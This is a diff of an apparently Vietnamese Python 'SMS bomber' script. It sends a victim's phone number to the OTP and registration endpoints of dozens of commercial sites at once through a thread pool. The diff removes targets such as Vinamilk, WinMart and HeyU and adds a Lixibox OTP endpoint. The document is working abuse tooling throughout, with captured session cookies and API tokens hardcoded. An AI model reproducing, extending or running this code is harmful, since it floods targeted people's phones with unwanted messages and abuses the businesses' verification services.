@@ -270,124 +270,6 @@ def galaxyplay():
     except requests.exceptions.RequestException:
         print("GALAXYPLAY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
-def hoangphuc():
-    cookies = {
-        'mage-banners-cache-storage': '{}',
-        'mage-cache-storage': '{}',
-        'mage-cache-storage-section-invalidation': '{}',
-        'PHPSESSID': 'ac5e556aba621e003eea52e3ee2e7306',
-        'form_key': 'foYNoUTBeSb3u9Ky',
-        'mage-messages': '',
-        'recently_viewed_product': '{}',
-        'recently_viewed_product_previous': '{}',
-        'recently_compared_product': '{}',
-        'recently_compared_product_previous': '{}',
-        'product_data_storage': '{}',
-        'mage-cache-sessid': 'true',
-        'mst-cache-warmer-track': '1721490287753',
-        'section_data_ids': '{}',
-        'private_content_version': 'c54559f3c098d65d341757813fe12a5b',
-    }
-
-    headers = {
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': 'mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; PHPSESSID=ac5e556aba621e003eea52e3ee2e7306; form_key=foYNoUTBeSb3u9Ky; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-cache-sessid=true; mst-cache-warmer-track=1721490287753; section_data_ids={}; private_content_version=c54559f3c098d65d341757813fe12a5b',
-        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6ImFiODFhNzc0NWI0YjUzNzUiLCJ0ciI6IjZhMTE4Y2I3NTEzNDQ5NjU5NzZlMzM1NGRkMTlmYmY5IiwidGkiOjE3MjI4MjY1MTIwNzIsInRrIjoiMTMyMjg0MCJ9fQ==',
-        'origin': 'https://hoang-phuc.com',
-        'priority': 'u=1, i',
-        'referer': 'https://hoang-phuc.com/customer/account/create/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'traceparent': '00-6a118cb751344965976e3354dd19fbf9-ab81a7745b4b5375-01',
-        'tracestate': '1322840@nr=0-1-4173019-1120237972-ab81a7745b4b5375----1722826512072',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data = {
-        'action_type': '1',
-        'tel': sdt,
-        'form_key': 'foYNoUTBeSb3u9Ky',
-    }
-
-    try:
-        response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("HOANGPHUC | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("HOANGPHUC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def gumac():
-    headers = {
-        'Accept': 'application/json',
-        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json',
-        'Origin': 'https://gumac.vn',
-        'Referer': 'https://gumac.vn/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-site',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-
-    json_data = {
-        'phone': sdt,
-    }
-
-    try:
-        response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("GUMAC | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("GUMAC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def vinamilk():
-    cookies = {
-        'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221733ebe33c1b9f55c4134169d86b9cbd%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36+OPR%2F112.%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721490628%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dadfe5819f98e4f3730eadce196c8027e',
-        '__cf_bm': 'eFcHUYLAsJGc8AY_lYQFm5T_AqbsUr63KlJUExtfJXA-1721490650-1.0.1.1-JqKOUYynCzeIAa2X5kjEWahdrfZ6Gm2Jf7jhjcS7eQ0P9vmR8TV8x66.Q6pWzXxzR5elXqZ_JIQkwZHljknwVQ',
-        'builderSessionId': 'b4ba9b33e12b4b4080e44f971f201bbd',
-        'sca_fg_codes': '[]',
-        'avadaIsLogin': '',
-    }
-
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-        'authorization': 'Bearer null',
-        'content-type': 'text/plain;charset=UTF-8',
-        # 'cookie': 'ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221733ebe33c1b9f55c4134169d86b9cbd%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36+OPR%2F112.%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721490628%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dadfe5819f98e4f3730eadce196c8027e; __cf_bm=eFcHUYLAsJGc8AY_lYQFm5T_AqbsUr63KlJUExtfJXA-1721490650-1.0.1.1-JqKOUYynCzeIAa2X5kjEWahdrfZ6Gm2Jf7jhjcS7eQ0P9vmR8TV8x66.Q6pWzXxzR5elXqZ_JIQkwZHljknwVQ; builderSessionId=b4ba9b33e12b4b4080e44f971f201bbd; sca_fg_codes=[]; avadaIsLogin=',
-        'origin': 'https://new.vinamilk.com.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://new.vinamilk.com.vn/account/register',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-    }
-
-    data = f'{{"type":"register","phone":"{sdt}"}}'
-
-    try:
-        response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("VINAMILK | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("VINAMILK | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
 def speedlotte():
     cookies = {
         '__Host-next-auth.csrf-token': '28d9fcfca28198873e9fe12de5d2f5a357dd4679f83316ccd6a84b17a33f2547%7C06a22f5c5af3f6669cfc95124b36be1c1454cd45a66b5bcda7444ff03a458b61',
@@ -540,40 +422,6 @@ def vieon():
         print("VIEON | TRẠNG THÁI : THÀNH CÔNG")
     except requests.exceptions.RequestException:
         print("VIEON | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-def winmart():
-    headers = {
-        'accept': 'application/json',
-        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-        'authorization': 'Bearer undefined',
-        'content-type': 'application/json',
-        'origin': 'https://winmart.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://winmart.vn/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-api-merchant': 'WCM',
-    }
-
-    json_data = {
-        'firstName': 'tran tranh',
-        'phoneNumber': sdt,
-        'masanReferralCode': '',
-        'dobDate': '1996-07-12',
-        'gender': 'Male',
-    }
-
-    try:
-        response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("WINMART | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("WINMART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
 def tgdidong():
     cookies = {
@@ -1519,39 +1367,6 @@ def foodhubzl():
     except requests.exceptions.RequestException:
         print("FOODHUBZL ABAHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
-def heyu():
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'app-version': '70814',
-        'authorization': '8996e28efe64d52bcea12d5165ebae17',
-        'content-type': 'application/json',
-        'origin': 'https://book.heyu.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://book.heyu.vn/login',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-    }
-
-    json_data = {
-        'phone': sdt,
-        'regionName': None,
-        'nativeVersion': 2027,
-        'reqT': 1721580987444,
-    }
-
-    try:
-        response = requests.post('https://book.heyu.vn/api/sms/send-code', headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("HEYU | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("HEYU | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
 def vttelecom():
     headers = {
         'accept': 'application/json, text/plain, */*',
@@ -1755,50 +1570,6 @@ def chudu24():
         print("CHUDU24 | TRẠNG THÁI : THÀNH CÔNG")
     except requests.exceptions.RequestException:
         print("CHUDU24 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-    
-def sojo():
-    headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'Authorization': '',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json',
-        'Origin': 'https://sojohotels.com',
-        'Referer': 'https://sojohotels.com/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-site',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-
-    params = {
-        'lang': 'vi',
-    }
-
-    json_data = {
-        'phone': sdt,
-        'fullName': 'ko co ten',
-        'email': 'fasfa@gmail.com',
-        'password': '1234',
-        'nationalityCode': '+84',
-        'nationalityAlphaCode': 'VN',
-        'isReceiveMessage': False,
-        'isLoyaltyUser': True,
-        'isPolicy': True,
-        'isSubmit': False,
-        'deviceToken': None,
-        'osType': 'web',
-    }
-
-    try:
-        response = requests.post('https://api.sojohotels.com/account/api/v2/user/register', params=params, headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("SOJO | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("SOJO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
 def hasaki():
     cookies = {
@@ -3884,36 +3655,6 @@ def vnsc():
     except requests.exceptions.RequestException:
         print("VNSC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
-def opes():
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-        'authorization': 'Bearer',
-        'o-chn': 'opes-website',
-        'o-client-id': 'c73894f9018617b8f00f741642e0dba3b53a2660ae1977b5efd1b65a99af67f3',
-        'o-gid': 'og.532b1985-a43e-4137-9fdb-0ca63dbd83a2',
-        'origin': 'https://opes.com.vn',
-        'priority': 'u=1, i',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-    }
-
-    params = {
-        'userName': sdt,
-    }
-
-    try:
-        response = requests.get('https://website-api.opes.com.vn/api/auth/register-request-otp', params=params, headers=headers)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("OPES | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("OPES | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
 def hoasenhome():
     headers = {
         'Accept': 'application/json',
@@ -4454,22 +4195,47 @@ def xanhsmzl():
     except requests.exceptions.RequestException:
         print("XANHSMZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
+def lixibox():
+    headers = {
+        'Accept': 'application/json',
+        'Referer': 'https://www.lixibox.com/',
+        'UUID': '697557576',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'Referrer-Url': 'https://www.google.com/',
+        'Content-type': 'application/json',
+    }
+
+    json_data = {
+        'request_type': 'phone_signup_verify',
+        'phone': sdt,
+    }
+
+    try:
+        response = requests.post('https://api.lixibox.com/web/otps', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("LIXIBOX | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("LIXIBOX | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+
+
+
 functions = [
     tv360, beautybox, kingfood, batdongsan, xanhsmzl, futabus, galaxyplay,
-    hoangphuc, gumac, vinamilk, speedlotte, medicare, tokyolife, vieon,
-    winmart, tgdidong, dienmayxanh, meta, thefaceshop, bestexpress,
+    speedlotte, medicare, tokyolife, vieon,
+    tgdidong, dienmayxanh, meta, thefaceshop, bestexpress,
     ghnexpress, myviettel, fptshop, sapo, paynet, reebok, gapowork, shine,
     oreka, fmstyle, acfc, fptlongchauzl, pantio, winny, owen, befood,
-    foodhubzl, heyu, pantioresend, vttelecom, vinwonders, vietair, etrip4u,
-    chudu24, sojo, hasaki, emart, ahamove, fahasa, vascara, sablanca,
+    foodhubzl, pantioresend, vttelecom, vinwonders, vietair, etrip4u,
+    chudu24, hasaki, emart, ahamove, fahasa, vascara, sablanca,
     routine, mioto, pharmartsms, medigosms, avakids, giathuoctot, medigozl,
     ddmevabereg, pnjsms, pharmartzl, jiohealth, ddmevabe, nhathuocankhang,
     mutosi, mocha, sigo, pnjzl, mamanbebe, tatmart, mrtho, hacom, xanhsmreg,
     ghtkreg, pcspostreg, book365reg, liena, gofood, pasgo, vietloan,
     viettelpost, xanhsm, acheckin, ghtk, pcspost, book365, richvn, nativex,
-    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc, opes,
+    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
     hoasenhome, bibomart, sbiz, thieuhoa, dchic, yvesrocher, guardian,
-    leflair, vayvnd, bibabo, mocha35, xanhsm2
+    leflair, vayvnd, bibabo, mocha35, xanhsm2, lixibox
 ]
 
 with concurrent.futures.ThreadPoolExecutor() as executor:
